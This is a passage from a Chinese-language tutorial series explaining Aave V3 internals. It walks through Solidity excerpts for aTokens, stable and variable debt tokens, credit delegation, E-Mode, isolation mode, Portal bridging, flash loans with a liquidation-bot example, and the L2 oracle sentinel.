fromBalanceBefore = super.balanceOf(from).rayMul(index);\n    uint256 toBalanceBefore = super.balanceOf(to).rayMul(index);\n \n    // 执行转账\n    super._transfer(from, to, amount.rayDiv(index).toUint128());\n \n    // 更新抵押品状态\n    if (validate) {\n        POOL.finalizeTransfer(_underlyingAsset, from, to, amount, fromBalanceBefore, toBalanceBefore);\n    }\n \n    emit BalanceTransfer(from, to, amount.rayDiv(index), index);\n}\n2.6 EIP-712 Permit\naToken 支持无 Gas 授权（签名授权）：\nbytes32 public constant PERMIT_TYPEHASH =\n    keccak256(&#039;Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)&#039;);\n \nfunction permit(\n    address owner,\n    address spender,\n    uint256 value,\n    uint256 deadline,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n) external override {\n    require(owner != address(0), Errors.ZERO_ADDRESS_NOT_VALID);\n    require(block.timestamp &lt;= deadline, Errors.INVALID_EXPIRATION);\n \n    uint256 currentValidNonce = _nonces[owner];\n    bytes32 digest = keccak256(\n        abi.encodePacked(\n            &#039;\\x19\\x01&#039;,\n            DOMAIN_SEPARATOR(),\n            keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, currentValidNonce, deadline))\n        )\n    );\n \n    require(owner == ecrecover(digest, v, r, s), Errors.INVALID_SIGNATURE);\n \n    _nonces[owner] = currentValidNonce + 1;\n    _approve(owner, spender, value);\n}\n\n3. StableDebtToken (固定利率债务)\n3.1 特点\n\n利率锁定：借款时利率固定，不随市场波动\n不可转移：禁用 transfer 和 transferFrom\n独立计息：每个用户有独立的利率和时间戳\n\n3.2 数据结构\ncontract StableDebtToken is DebtTokenBase, IncentivizedERC20, IStableDebtToken {\n    // 用户状态：additionalData 存储用户的固定利率\n    // 继承自 IncentivizedERC20 的 _userState mapping\n \n    // 用户借款时间戳\n    mapping(address =&gt; uint40) internal _timestamps;\n \n    // 全局平均固定利率\n    uint128 internal _avgStableRate;\n \n    // 固定债务总量\n    uint128 internal _totalSupply;\n}\n3.3 余额计算\n固定利率债务使用复利计算：\nfunction balanceOf(address account) public view virtual override returns (uint256) {\n    uint256 accountBalance = super.balanceOf(account);\n    if (accountBalance == 0) {\n        return 0;\n    }\n \n    // 获取用户的固定利率\n    uint256 stableRate = _userState[account].additionalData;\n \n    // 计算复利\n    uint256 cumulatedInterest = MathUtils.calculateCompoundedInterest(\n        stableRate,\n        _timestamps[account]\n    );\n \n    // 当前债务 = 本金 × 复利因子\n    return accountBalance.rayMul(cumulatedInterest);\n}\n3.4 铸造（借款）\nfunction mint(\n    address user,\n    address onBehalfOf,\n    uint256 amount,\n    uint256 rate\n) external override onlyPool returns (bool, uint256, uint256) {\n    MintLocalVars memory vars;\n \n    // 获取用户当前债务\n    vars.previousBalance = super.balanceOf(onBehalfOf);\n    vars.currentBalance = _calcUserStableBalance(vars.previousBalance, onBehalfOf);\n \n    // 计算新的平均利率\n    vars.nextStableRate = _calculateNewStableRate(\n        vars.previousBalance,\n        _userState[onBehalfOf].additionalData,\n        amount,\n        rate\n    );\n \n    // 更新用户利率\n    _userState[onBehalfOf].additionalData = vars.nextStableRate.toUint128();\n \n    // 更新时间戳\n    _timestamps[onBehalfOf] = uint40(block.timestamp);\n \n    // 更新总供应量和全局平均利率\n    vars.previousSupply = _totalSupply;\n    vars.currentAvgStableRate = _avgStableRate;\n    vars.nextSupply = _totalSupply = (vars.previousSupply + amount).toUint128();\n \n    vars.nextAvgStableRate = _calculateNextAvgStableRate(\n        vars.previousSupply,\n        vars.currentAvgStableRate,\n        vars.currentBalance + amount,\n        vars.nextStableRate\n    );\n    _avgStableRate = vars.nextAvgStableRate.toUint128();\n \n    // 铸造债务代币\n    _mint(onBehalfOf, (vars.currentBalance + amount).toUint128());\n \n    emit Transfer(address(0), onBehalfOf, vars.currentBalance + amount);\n    emit Mint(\n        user,\n        onBehalfOf,\n        vars.currentBalance + amount,\n        vars.currentBalance,\n        vars.nextStableRate,\n        vars.nextAvgStableRate,\n        vars.nextSupply\n    );\n \n    return (vars.previousBalance == 0, vars.nextSupply, vars.nextAvgStableRate);\n}\n3.5 平均利率计算\nfunction _calculateNextAvgStableRate(\n    uint256 previousTotalSupply,\n    uint256 previousAvgStableRate,\n    uint256 newAmount,\n    uint256 newRate\n) internal pure returns (uint256) {\n    // 加权平均: (旧总量 × 旧利率 + 新金额 × 新利率) / 新总量\n    return (previousTotalSupply.rayMul(previousAvgStableRate) + newAmount.rayMul(newRate))\n        .rayDiv(previousTotalSupply + newAmount);\n}\n\n4. VariableDebtToken (浮动利率债务)\n4.1 特点\n\n利率浮动：利率随市场供需变化\n缩放机制：与 aToken 类似使用缩放余额\n不可转移：禁用 transfer 和 transferFrom\n\n4.2 余额计算\nfunction balanceOf(address user) public view virtual override returns (uint256) {\n    uint256 scaledBalance = super.balanceOf(user);\n    if (scaledBalance == 0) {\n        return 0;\n    }\n    // 实际债务 = 缩放余额 × 当前可变借贷指数\n    return scaledBalance.rayMul(POOL.getReserveNormalizedVariableDebt(_underlyingAsset));\n}\n4.3 铸造（借款）\nfunction mint(\n    address user,\n    address onBehalfOf,\n    uint256 amount,\n    uint256 index\n) external override onlyPool returns (bool, uint256) {\n    // 检查金额\n    if (user != onBehalfOf) {\n        _decreaseBorrowAllowance(onBehalfOf, user, amount);\n    }\n \n    // 计算缩放金额\n    uint256 amountScaled = amount.rayDiv(index);\n    require(amountScaled != 0, Errors.INVALID_MINT_AMOUNT);\n \n    // 铸造\n    uint256 scaledBalance = super.balanceOf(onBehalfOf);\n    _mint(onBehalfOf, amountScaled.toUint128());\n \n    uint256 newScaledBalance = scaledBalance + amountScaled;\n \n    emit Transfer(address(0), onBehalfOf, amount);\n    emit Mint(user, onBehalfOf, amount, amountScaled, index);\n \n    return (scaledBalance == 0, newScaledBalance);\n}\n4.4 销毁（还款）\nfunction burn(\n    address from,\n    uint256 amount,\n    uint256 index\n) external override onlyPool returns (uint256) {\n    uint256 amountScaled = amount.rayDiv(index);\n    require(amountScaled != 0, Errors.INVALID_BURN_AMOUNT);\n \n    _burn(from, amountScaled.toUint128());\n \n    uint256 newScaledBalance = super.balanceOf(from);\n \n    emit Transfer(from, address(0), amount);\n    emit Burn(from, amount, amountScaled, index);\n \n    return newScaledBalance;\n}\n\n5. 信用委托机制\n5.1 概述\n信用委托允许用户将借贷额度授权给第三方，而无需转移抵押品：\nAlice (存款人) --授权--&gt; Bob (借款人)\n    │                      │\n    └──── 信用额度 ─────────┘\n\n5.2 实现\n// DebtTokenBase.sol\nabstract contract DebtTokenBase {\n    // 借贷授权额度\n    mapping(address =&gt; mapping(address =&gt; uint256)) internal _borrowAllowances;\n \n    // 授权借贷额度\n    function approveDelegation(address delegatee, uint256 amount) external override {\n        _borrowAllowances[msg.sender][delegatee] = amount;\n        emit BorrowAllowanceDelegated(msg.sender, delegatee, _getUnderlyingAssetAddress(), amount);\n    }\n \n    // 查询借贷额度\n    function borrowAllowance(address fromUser, address toUser)\n        external view override returns (uint256)\n    {\n        return _borrowAllowances[fromUser][toUser];\n    }\n \n    // 消耗借贷额度\n    function _decreaseBorrowAllowance(\n        address delegator,\n        address delegatee,\n        uint256 amount\n    ) internal {\n        uint256 newAllowance = _borrowAllowances[delegator][delegatee] - amount;\n        _borrowAllowances[delegator][delegatee] = newAllowance;\n        emit BorrowAllowanceDelegated(delegator, delegatee, _getUnderlyingAssetAddress(), newAllowance);\n    }\n}\n5.3 使用场景\n场景 1：机构借贷\n主账户 A 有大量抵押品\n├── 授权子账户 B 借贷 100,000 USDC\n├── 授权子账户 C 借贷 50,000 USDC\n└── 债务由主账户 A 承担\n\n场景 2：DeFi 协议集成\n用户授权 Yield Protocol 使用其借贷额度\n├── Protocol 代用户借贷\n├── 执行策略操作\n└── 利润返还用户\n\n\n6. 禁用转账\n债务代币禁用标准 ERC-20 转账：\n// DebtTokenBase.sol\nfunction transfer(address, uint256) external virtual override returns (bool) {\n    revert(Errors.OPERATION_NOT_SUPPORTED);\n}\n \nfunction allowance(address, address) external view virtual override returns (uint256) {\n    revert(Errors.OPERATION_NOT_SUPPORTED);\n}\n \nfunction approve(address, uint256) external virtual override returns (bool) {\n    revert(Errors.OPERATION_NOT_SUPPORTED);\n}\n \nfunction transferFrom(address, address, uint256) external virtual override returns (bool) {\n    revert(Errors.OPERATION_NOT_SUPPORTED);\n}\n \nfunction increaseAllowance(address, uint256) external virtual override returns (bool) {\n    revert(Errors.OPERATION_NOT_SUPPORTED);\n}\n \nfunction decreaseAllowance(address, uint256) external virtual override returns (bool) {\n    revert(Errors.OPERATION_NOT_SUPPORTED);\n}\n为什么禁用？\n\n债务是个人责任，不能转移\n防止逃避清算\n维护协议安全性\n\n\n7. 代币对比\n7.1 三种代币对比\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n特性aTokenStableDebtTokenVariableDebtToken用途存款凭证固定利率债务浮动利率债务可转移✅ 是❌ 否❌ 否余额计算缩放余额 × 指数本金 × 复利缩放余额 × 指数利率类型存款利率固定借贷利率浮动借贷利率利息累积线性复利复合复利复合复利Permit✅ 支持❌ 不支持❌ 不支持\n7.2 余额计算对比\naToken:\n  realBalance = scaledBalance × liquidityIndex\n\nStableDebtToken:\n  realDebt = principal × compoundedInterest(userRate, timeDelta)\n\nVariableDebtToken:\n  realDebt = scaledBalance × variableBorrowIndex\n\n7.3 Gas 消耗对比\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n操作aTokenStableDebtTokenVariableDebtTokenmint~50,000~60,000~50,000burn~40,000~50,000~40,000transfer~45,000N/AN/AbalanceOf~3,000~5,000~3,000\n\n8. 激励机制\n8.1 IncentivizedERC20\n所有代币都继承自 IncentivizedERC20，支持外部激励：\nabstract contract IncentivizedERC20 is Context, IERC20Detailed {\n    // 激励控制器\n    IRewardsController internal _rewardsController;\n \n    // 用户状态\n    mapping(address =&gt; UserState) internal _userState;\n \n    struct UserState {\n        uint128 balance;          // 缩放余额\n        uint128 additionalData;   // 附加数据（StableDebtToken 用于存储利率）\n    }\n \n    // 在余额变化时通知激励控制器\n    function _mint(address account, uint128 amount) internal virtual {\n        uint256 oldTotalSupply = _totalSupply;\n        _totalSupply = oldTotalSupply + amount;\n \n        uint128 oldAccountBalance = _userState[account].balance;\n        _userState[account].balance = oldAccountBalance + amount;\n \n        IRewardsController rewardsControllerLocal = _rewardsController;\n        if (address(rewardsControllerLocal) != address(0)) {\n            rewardsControllerLocal.handleAction(account, oldTotalSupply, oldAccountBalance);\n        }\n    }\n \n    function _burn(address account, uint128 amount) internal virtual {\n        uint256 oldTotalSupply = _totalSupply;\n        _totalSupply = oldTotalSupply - amount;\n \n        uint128 oldAccountBalance = _userState[account].balance;\n        _userState[account].balance = oldAccountBalance - amount;\n \n        IRewardsController rewardsControllerLocal = _rewardsController;\n        if (address(rewardsControllerLocal) != address(0)) {\n            rewardsControllerLocal.handleAction(account, oldTotalSupply, oldAccountBalance);\n        }\n    }\n}\n8.2 激励类型\n\n流动性挖矿：持有 aToken 获得额外代币奖励\n借贷激励：借贷特定资产获得奖励\n安全模块：质押 stkAAVE 获得安全激励\n\n\n9. 小结\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n机制实现方式优势缩放余额存储除以指数的值自动复利，低 Gas信用委托borrowAllowance mapping灵活的借贷授权禁用转账重写 transfer 函数债务不可逃避激励集成IncentivizedERC20支持外部激励\n关键公式：\naToken 余额 = scaledBalance × liquidityIndex\n稳定债务 = principal × (1 + rate)^time\n可变债务 = scaledBalance × variableBorrowIndex\n\n下一章将讲解 E-Mode、隔离模式、Portal 和闪电贷等高级功能。"},"blockchainguide/DApp_Development/应用场景/defi/aave/05-高级功能":{"slug":"blockchainguide/DApp_Development/应用场景/defi/aave/05-高级功能","filePath":"blockchainguide/DApp_Development/应用场景/defi/aave/05-高级功能.md","title":"05-高级功能","links":[],"tags":[],"content":"Aave V3 高级功能\n1. E-Mode (效率模式)\n1.1 概述\nE-Mode 允许相关性资产（如稳定币之间）获得更高的资本效率：\n普通模式                        E-Mode (稳定币)\n┌──────────────┐               ┌──────────────┐\n│ LTV: 80%     │               │ LTV: 97%     │\n│ 清算阈值: 82.5% │  ─升级──▶   │ 清算阈值: 98%  │\n│ 清算奖励: 5%  │               │ 清算奖励: 1%  │\n└──────────────┘               └──────────────┘\n\n1.2 E-Mode 类别\nstruct EModeCategory {\n    uint16 ltv;                  // LTV (97% = 9700)\n    uint16 liquidationThreshold; // 清算阈值 (98% = 9800)\n    uint16 liquidationBonus;     // 清算奖励 (1% = 10100)\n    address priceSource;         // 自定义价格源（可选）\n    string label;                // 类别标签\n}\n1.3 类别示例\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n类别 ID标签LTV清算阈值清算奖励资产1Stablecoins97%98%1%USDC, USDT, DAI2ETH Correlated93%95%1%ETH, stETH, wstETH3BTC Correlated93%95%1%WBTC, renBTC\n1.4 设置用户 E-Mode\n// Pool.sol\nfunction setUserEMode(uint8 categoryId) external virtual override {\n    EModeLogic.executeSetUserEMode(\n        _reserves,\n        _reservesList,\n        _eModeCategories,\n        _usersEModeCategory,\n        _usersConfig[msg.sender],\n        DataTypes.ExecuteSetUserEModeParams({\n            reservesCount: _reservesCount,\n            oracle: ADDRESSES_PROVIDER.getPriceOracle(),\n            categoryId: categoryId\n        })\n    );\n}\n1.5 E-Mode 逻辑\n// EModeLogic.sol\nfunction executeSetUserEMode(\n    mapping(address =&gt; DataTypes.ReserveData) storage reservesData,\n    mapping(uint256 =&gt; address) storage reservesList,\n    mapping(uint8 =&gt; DataTypes.EModeCategory) storage eModeCategories,\n    mapping(address =&gt; uint8) storage usersEModeCategory,\n    DataTypes.UserConfigurationMap storage userConfig,\n    DataTypes.ExecuteSetUserEModeParams memory params\n) external {\n    // 验证类别存在\n    if (params.categoryId != 0) {\n        require(\n            eModeCategories[params.categoryId].liquidationThreshold != 0,\n            Errors.INCONSISTENT_EMODE_CATEGORY\n        );\n    }\n \n    uint8 prevCategoryId = usersEModeCategory[msg.sender];\n    if (prevCategoryId != params.categoryId) {\n        // 更新用户 E-Mode 类别\n        usersEModeCategory[msg.sender] = params.categoryId;\n \n        // 验证切换后健康因子仍然健康\n        if (params.categoryId != 0) {\n            require(\n                _validateEModeCategory(\n                    reservesData,\n                    reservesList,\n                    eModeCategories,\n                    userConfig,\n                    params\n                ),\n                Errors.INCONSISTENT_EMODE_CATEGORY\n            );\n        }\n \n        // 检查健康因子\n        (, , , , uint256 healthFactor, ) = GenericLogic.calculateUserAccountData(\n            reservesData,\n            reservesList,\n            eModeCategories,\n            DataTypes.CalculateUserAccountDataParams({\n                userConfig: userConfig,\n                reservesCount: params.reservesCount,\n                user: msg.sender,\n                oracle: params.oracle,\n                userEModeCategory: params.categoryId\n            })\n        );\n \n        require(\n            healthFactor &gt;= HEALTH_FACTOR_LIQUIDATION_THRESHOLD,\n            Errors.HEALTH_FACTOR_LOWER_THAN_LIQUIDATION_THRESHOLD\n        );\n    }\n \n    emit UserEModeSet(msg.sender, params.categoryId);\n}\n1.6 E-Mode 效率计算\n场景：用户存入 10,000 USDC，借出 USDT\n\n普通模式:\n- 最大借贷 = 10,000 × 80% = 8,000 USDT\n- 有效杠杆 = 10,000 / (10,000 - 8,000) = 5x\n\nE-Mode (稳定币):\n- 最大借贷 = 10,000 × 97% = 9,700 USDT\n- 有效杠杆 = 10,000 / (10,000 - 9,700) = 33x\n\n资本效率提升: 33x / 5x = 6.6 倍\n\n\n2. Isolation Mode (隔离模式)\n2.1 概述\n隔离模式允许新资产在受控环境中上线，限制风险敞口：\n隔离模式资产\n┌────────────────────────────────────┐\n│ 特点:                              │\n│ • 只能作为唯一抵押品               │\n│ • 只能借出稳定币                   │\n│ • 有债务上限                       │\n│ • 逐步提升信任度后可解除限制       │\n└────────────────────────────────────┘\n\n2.2 配置参数\nstruct ReserveData {\n    // ... 其他字段\n    uint128 isolationModeTotalDebt;  // 当前隔离模式总债务\n}\n \n// ReserveConfiguration 中的隔离模式参数\n// bit 212-251: debt ceiling (隔离模式债务上限)\n2.3 隔离模式检测\n// UserConfiguration.sol\nfunction getIsolationModeState(\n    DataTypes.UserConfigurationMap storage self,\n    mapping(address =&gt; DataTypes.ReserveData) storage reservesData,\n    mapping(uint256 =&gt; address) storage reservesList\n) internal view returns (bool, address, uint256) {\n    // 遍历用户抵押品\n    if (self.isEmpty()) {\n        return (false, address(0), 0);\n    }\n \n    uint256 firstAssetId = self.getFirstAssetIdByMask(COLLATERAL_MASK);\n \n    if (reservesData[reservesList[firstAssetId]].configuration.getDebtCeiling() != 0) {\n        address isolationModeCollateral = reservesList[firstAssetId];\n        return (\n            true,\n            isolationModeCollateral,\n            reservesData[isolationModeCollateral].configuration.getDebtCeiling()\n        );\n    }\n \n    return (false, address(0), 0);\n}\n2.4 隔离模式借贷限制\n// ValidationLogic.sol (借贷验证)\nfunction validateBorrow(...) internal view {\n    // ...\n \n    // 隔离模式检查\n    if (params.isolationModeActive) {\n        // 只允许借出标记为可在隔离模式借出的资产\n        require(\n            params.reserveCache.reserveConfiguration.getBorrowableInIsolation(),\n            Errors.ASSET_NOT_BORROWABLE_IN_ISOLATION\n        );\n \n        // 检查债务上限\n        require(\n            reservesData[params.isolationModeCollateralAddress].isolationModeTotalDebt +\n                (params.amount /\n                    10 ** (params.reserveCache.reserveConfiguration.getDecimals() -\n                        ReserveConfiguration.DEBT_CEILING_DECIMALS)) &lt;=\n                params.isolationModeDebtCeiling,\n            Errors.DEBT_CEILING_EXCEEDED\n        );\n    }\n}\n2.5 隔离模式示例\n场景：新代币 XYZ 上线，设置为隔离模式\n\n配置:\n- XYZ 债务上限: 1,000,000 USD\n- XYZ LTV: 50%\n- 可借出资产: 仅 USDC, USDT, DAI\n\n用户操作:\n1. 存入 1000 XYZ (价值 $10,000)\n2. 最大可借: 10,000 × 50% = 5,000 USDC\n3. 无法同时使用其他抵押品\n4. 无法借出非稳定币资产\n\n\n3. Portal (跨链桥接)\n3.1 概述\nPortal 允许在不同链上铸造未支持的 aToken，实现跨链流动性：\n源链 (Ethereum)                    目标链 (Polygon)\n┌─────────────┐                   ┌─────────────┐\n│  用户资产   │                   │  用户资产   │\n│  100 USDC   │                   │  0 USDC     │\n└─────────────┘                   └─────────────┘\n       │                                 │\n       ▼                                 ▼\n┌─────────────┐    Portal        ┌─────────────┐\n│  aUSDC      │ ═══════════════▶ │  aUSDC      │\n│  销毁       │    (跨链消息)    │  铸造       │\n└─────────────┘                   └─────────────┘\n\n3.2 Mint Unbacked\n在目标链铸造未支持的 aToken：\n// BridgeLogic.sol\nfunction executeMintUnbacked(\n    mapping(address =&gt; DataTypes.ReserveData) storage reservesData,\n    mapping(uint256 =&gt; address) storage reservesList,\n    DataTypes.UserConfigurationMap storage userConfig,\n    address asset,\n    uint256 amount,\n    address onBehalfOf,\n    uint16 referralCode\n) external {\n    DataTypes.ReserveData storage reserve = reservesData[asset];\n    DataTypes.ReserveCache memory reserveCache = reserve.cache();\n \n    reserve.updateState(reserveCache);\n \n    // 验证\n    ValidationLogic.validateUnbacked(reserveCache, amount, reserve);\n \n    // 增加 unbacked 计数\n    uint256 unbackedMintCap = reserveCache.reserveConfiguration.getUnbackedMintCap();\n    uint256 reserveDecimals = reserveCache.reserveConfiguration.getDecimals();\n \n    uint256 currentUnbacked = reserve.unbacked += amount.toUint128();\n \n    require(\n        currentUnbacked &lt;= unbackedMintCap * (10 ** reserveDecimals),\n        Errors.UNBACKED_MINT_CAP_EXCEEDED\n    );\n \n    // 铸造 aToken\n    bool isFirstSupply = IAToken(reserveCache.aTokenAddress).mint(\n        msg.sender,\n        onBehalfOf,\n        amount,\n        reserveCache.nextLiquidityIndex\n    );\n \n    if (isFirstSupply) {\n        if (\n            ValidationLogic.validateAutomaticUseAsCollateral(\n                reservesData,\n                reservesList,\n                userConfig,\n                reserveCache.reserveConfiguration,\n                reserveCache.aTokenAddress\n            )\n        ) {\n            userConfig.setUsingAsCollateral(reserve.id, true);\n            emit ReserveUsedAsCollateralEnabled(asset, onBehalfOf);\n        }\n    }\n \n    emit MintUnbacked(asset, msg.sender, onBehalfOf, amount, referralCode);\n}\n3.3 Back Unbacked\n在源链销毁资产，完成跨链：\nfunction executeBackUnbacked(\n    DataTypes.ReserveData storage reserve,\n    address asset,\n    uint256 amount,\n    uint256 fee\n) external returns (uint256) {\n    DataTypes.ReserveCache memory reserveCache = reserve.cache();\n \n    reserve.updateState(reserveCache);\n \n    // 计算实际支持金额\n    uint256 backingAmount = (amount &lt; reserve.unbacked) ? amount : reserve.unbacked;\n    uint256 feeAmount = amount.percentMul(fee);\n \n    // 减少 unbacked 计数\n    reserve.unbacked -= backingAmount.toUint128();\n \n    // 累积费用到国库\n    reserve.accruedToTreasury += (backingAmount + feeAmount)\n        .rayDiv(reserveCache.nextLiquidityIndex)\n        .toUint128();\n \n    // 更新利率\n    reserve.updateInterestRates(reserveCache, asset, backingAmount + feeAmount, 0);\n \n    // 转移资产\n    IERC20(asset).safeTransferFrom(msg.sender, reserveCache.aTokenAddress, backingAmount + feeAmount);\n \n    emit BackUnbacked(asset, msg.sender, backingAmount, feeAmount);\n \n    return backingAmount;\n}\n3.4 Portal 费用机制\n费用 = bridgeAmount × bridgeProtocolFee\n\n费用分配:\n└── 100% → 协议国库\n\n这笔费用补偿协议承担的跨链风险\n\n\n4. Flash Loan (闪电贷)\n4.1 概述\n闪电贷允许在单笔交易内无抵押借贷任意金额：\n单笔交易\n┌──────────────────────────────────────────────┐\n│ 1. 借出资产                                   │\n│ 2. 执行自定义逻辑                             │\n│ 3. 归还资产 + 手续费                          │\n│                                              │\n│ 如果无法归还 → 整笔交易回滚                   │\n└──────────────────────────────────────────────┘\n\n4.2 闪电贷类型\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n类型函数特点简单闪电贷flashLoanSimple单一资产批量闪电贷flashLoan多资产，可选开仓\n4.3 简单闪电贷\n// FlashLoanLogic.sol\nfunction executeFlashLoanSimple(\n    DataTypes.ReserveData storage reserve,\n    DataTypes.FlashLoanSimpleParams memory params\n) external {\n    DataTypes.ReserveCache memory reserveCache = reserve.cache();\n    reserve.updateState(reserveCache);\n \n    // 验证\n    ValidationLogic.validateFlashloanSimple(reserveCache);\n \n    // 计算手续费\n    uint256 totalPremium = params.amount.percentMul(params.flashLoanPremiumTotal);\n \n    // 转移资产给借款人\n    IAToken(reserveCache.aTokenAddress).transferUnderlyingTo(\n        params.receiverAddress,\n        params.amount\n    );\n \n    // 执行用户逻辑\n    require(\n        IFlashLoanSimpleReceiver(params.receiverAddress).executeOperation(\n            params.asset,\n            params.amount,\n            totalPremium,\n            msg.sender,\n            params.params\n        ),\n        Errors.INVALID_FLASHLOAN_EXECUTOR_RETURN\n    );\n \n    // 验证归还\n    uint256 amountPlusPremium = params.amount + totalPremium;\n    IERC20(params.asset).safeTransferFrom(\n        params.receiverAddress,\n        reserveCache.aTokenAddress,\n        amountPlusPremium\n    );\n \n    // 手续费分配\n    _handleFlashLoanRepayment(\n        reserve,\n        reserveCache,\n        params.flashLoanPremiumToProtocol,\n        totalPremium\n    );\n \n    emit FlashLoan(\n        params.receiverAddress,\n        msg.sender,\n        params.asset,\n        params.amount,\n        DataTypes.InterestRateMode.NONE,\n        totalPremium,\n        params.referralCode\n    );\n}\n4.4 批量闪电贷\nfunction executeFlashLoan(\n    mapping(address =&gt; DataTypes.ReserveData) storage reservesData,\n    mapping(uint256 =&gt; address) storage reservesList,\n    mapping(uint8 =&gt; DataTypes.EModeCategory) storage eModeCategories,\n    mapping(address =&gt; DataTypes.UserConfigurationMap) storage usersConfig,\n    DataTypes.FlashLoanParams memory params\n) external {\n    FlashLoanLocalVars memory vars;\n \n    ValidationLogic.validateFlashloan(reservesData, params.assets, params.amounts);\n \n    vars.receiver = IFlashLoanReceiver(params.receiverAddress);\n \n    // 转移所有资产给借款人\n    for (vars.i = 0; vars.i &lt; params.assets.length; vars.i++) {\n        vars.currentAmount = params.amounts[vars.i];\n        vars.currentAsset = params.assets[vars.i];\n        vars.currentATokenAddress = reservesData[vars.currentAsset].aTokenAddress;\n \n        vars.currentPremium = params.interestRateModes[vars.i] ==\n            DataTypes.InterestRateMode.NONE\n            ? vars.currentAmount.percentMul(vars.totalPremium)\n            : 0;\n \n        vars.flashloanPremiums[vars.i] = vars.currentPremium;\n \n        IAToken(vars.currentATokenAddress).transferUnderlyingTo(\n            params.receiverAddress,\n            vars.currentAmount\n        );\n    }\n \n    // 执行用户逻辑\n    require(\n        vars.receiver.executeOperation(\n            params.assets,\n            params.amounts,\n            vars.flashloanPremiums,\n            msg.sender,\n            params.params\n        ),\n        Errors.INVALID_FLASHLOAN_EXECUTOR_RETURN\n    );\n \n    // 处理归还或开仓\n    for (vars.i = 0; vars.i &lt; params.assets.length; vars.i++) {\n        vars.currentAsset = params.assets[vars.i];\n        vars.currentAmount = params.amounts[vars.i];\n \n        if (params.interestRateModes[vars.i] == DataTypes.InterestRateMode.NONE) {\n            // 完全归还\n            _handleFlashLoanRepayment(...)\n        } else {\n            // 开仓：保留借贷，创建债务头寸\n            BorrowLogic.executeBorrow(...)\n        }\n    }\n}\n4.5 闪电贷接收者接口\ninterface IFlashLoanSimpleReceiver {\n    function executeOperation(\n        address asset,\n        uint256 amount,\n        uint256 premium,\n        address initiator,\n        bytes calldata params\n    ) external returns (bool);\n}\n \ninterface IFlashLoanReceiver {\n    function executeOperation(\n        address[] calldata assets,\n        uint256[] calldata amounts,\n        uint256[] calldata premiums,\n        address initiator,\n        bytes calldata params\n    ) external returns (bool);\n}\n4.6 闪电贷费用\n总费用 = 借款金额 × flashLoanPremiumTotal\n\n费用分配:\n├── LP 收益 = 总费用 × (1 - protocolFee%)\n└── 协议收入 = 总费用 × protocolFee%\n\n典型参数:\n- flashLoanPremiumTotal: 0.09% (9 bps)\n- protocolFee: 30%\n\n4.7 闪电贷用例\n// 清算套利示例\ncontract FlashLiquidator is IFlashLoanSimpleReceiver {\n    IPool public pool;\n    ISwapRouter public router;\n \n    function liquidateWithFlashLoan(\n        address collateralAsset,\n        address debtAsset,\n        address user,\n        uint256 debtToCover\n    ) external {\n        // 发起闪电贷借出债务资产\n        pool.flashLoanSimple(\n            address(this),\n            debtAsset,\n            debtToCover,\n            abi.encode(collateralAsset, user),\n            0\n        );\n    }\n \n    function executeOperation(\n        address asset,\n        uint256 amount,\n        uint256 premium,\n        address initiator,\n        bytes calldata params\n    ) external override returns (bool) {\n        (address collateralAsset, address user) = abi.decode(params, (address, address));\n \n        // 批准池子使用资产\n        IERC20(asset).approve(address(pool), amount);\n \n        // 执行清算，获得抵押品\n        pool.liquidationCall(collateralAsset, asset, user, amount, false);\n \n        // 出售抵押品获得债务资产\n        uint256 collateralReceived = IERC20(collateralAsset).balanceOf(address(this));\n        IERC20(collateralAsset).approve(address(router), collateralReceived);\n \n        router.exactInputSingle(ISwapRouter.ExactInputSingleParams({\n            tokenIn: collateralAsset,\n            tokenOut: asset,\n            fee: 3000,\n            recipient: address(this),\n            deadline: block.timestamp,\n            amountIn: collateralReceived,\n            amountOutMinimum: amount + premium,\n            sqrtPriceLimitX96: 0\n        }));\n \n        // 批准归还\n        IERC20(asset).approve(address(pool), amount + premium);\n \n        return true;\n    }\n}\n\n5. 预言机哨兵\n5.1 概述\n预言机哨兵用于 L2 网络，在序列器故障时保护协议：\n正常状态                         序列器故障\n┌──────────────┐               ┌──────────────┐\n│ 借贷: ✅ 允许  │               │ 借贷: ❌ 暂停  │\n│ 清算: ✅ 允许  │  ───故障───▶  │ 清算: ❌ 暂停  │\n└──────────────┘               └──────────────┘\n\n5.2 实现\n// PriceOracleSentinel.sol\ncontract PriceOracleSentinel is IPriceOracleSentinel {\n    ISequencerOracle public sequencerOracle;\n    uint256 public gracePeriod;\n \n    function isBorrowAllowed() external view override returns (bool) {\n        return _isUpAndGracePeriodPassed();\n    }\n \n    function isLiquidationAllowed() external view override returns (bool) {\n        return _isUpAndGracePeriodPassed();\n    }\n \n    function _isUpAndGracePeriodPassed() internal view returns (bool) {\n        (bool isSequencerUp, uint256 lastUpdateTimestamp) = sequencerOracle.latestRoundData();\n \n        // 序列器必须在线\n        if (!isSequencerUp) {\n            return false;\n        }\n \n        // 必须过了优雅期\n        if (block.timestamp - lastUpdateTimestamp &lt; gracePeriod) {\n            return false;\n        }\n \n        return true;\n    }\n}\n5.3 使用场景\nArbitrum/Optimism 等 L2 网络:\n\n1. 序列器正常运行 → 所有操作正常\n2. 序列器故障 → 借贷和清算暂停\n3. 序列器恢复 → 等待优雅期（如 1 小时）\n4. 优雅期结束 → 恢复正常操作\n\n优雅期的目的：\n- 让用户有时间补充抵押品\n- 避免在价格不确定时被清算\n\n\n6. 功能对比总结\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n功能目的风险/限制E-Mode提高相关资产资本效率只能使用同类资产Isolation新资产安全上线债务上限、单一抵押Portal跨链流动性桥接风险、费用Flash Loan无抵押即时借贷必须同交易归还SentinelL2 网络保护故障时功能受限\n\n7. 小结\nAave V3 的高级功能显著提升了协议的灵活性和安全性：\n\nE-Mode：稳定币间借贷效率提升 6 倍以上\nIsolation 